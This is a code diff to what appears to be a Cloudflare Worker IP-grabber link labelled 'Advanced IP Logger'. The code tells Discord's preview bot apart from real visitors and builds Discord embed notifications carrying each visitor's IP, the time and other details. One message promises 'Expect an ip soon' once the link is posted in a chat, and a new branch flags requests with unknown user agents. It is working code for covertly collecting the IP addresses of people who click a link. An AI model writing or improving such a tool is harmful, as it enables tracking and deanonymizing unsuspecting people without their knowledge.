@@ -11,7 +11,10 @@ export default {
     // Check if the request is from Discord's bot
     const isDiscordBot = userAgent.includes('Discordbot') || userAgent.includes('discordapp.com')
     
-    // Create different embed based on whether it's Discord or a real visitor
+    // Check if user agent is unknown
+    const isUnknownAgent = userAgent === 'Unknown' || userAgent.trim() === ''
+    
+    // Create different embed based on the request type
     let embedData;
     
     if (isDiscordBot) {
@@ -20,7 +23,17 @@ export default {
         embeds: [{
           title: "Link was sent somewhere in a chat",
           color: 3447003, // Discord blue color
-          footer: { text: "expect an ip soon" }
+          footer: { text: "Expect an ip soon" }
+        }]
+      }
+    } else if (isUnknownAgent) {
+      // Special notification for unknown user agents
+      embedData = {
+        embeds: [{
+          title: "Discord monkey agent tried accessing link",
+          color: 15158332, // Red color
+          description: `\`\`\`IP: ${cfConnectingIP}\nTime: ${time}\`\`\``,
+          footer: { text: "Suspicious Access Detected" }
         }]
       }
     } else {
@@ -42,7 +55,7 @@ export default {
       // Full notification for real visitors with tree-branch design
       embedData = {
         embeds: [{
-          title: "🌲 New Visitor Detected 🌲",
+          title: "New Visitor Detected",
           color: 5814783,
           description: `\`\`\`${ipTreeFormat}${otherInfoFormat}\`\`\``,
           footer: { text: "Advanced IP Logger" }
